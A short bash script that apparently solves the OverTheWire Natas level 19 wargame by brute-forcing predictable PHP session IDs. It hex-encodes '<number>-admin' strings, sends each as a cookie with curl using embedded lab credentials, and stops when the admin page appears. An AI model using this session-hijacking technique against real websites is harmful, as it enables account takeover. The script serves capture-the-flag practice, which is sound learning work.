#session_prediction
#!/bin/bash

url=http://natas19.natas.labs.overthewire.org/index.php
auth="natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
success="You are an admin. The credentials for the next level*"


for id in {0..641}
do
    sesid="$id-admin"
    echo "Sesid: $sesid"
    hexid=$(echo -n "$sesid" | xxd -ps)
    echo "Hex: $hexid"
    if(curl \
    -u $auth \
    -b "PHPSESSID=$hexid" \
    -s \
    -o 2>/dev/null \
    -d "username=admin" \
    -d "password=1" \
    $url \
    | grep -A 2 "$success")
    then
        echo "Success"
        break
    fi
done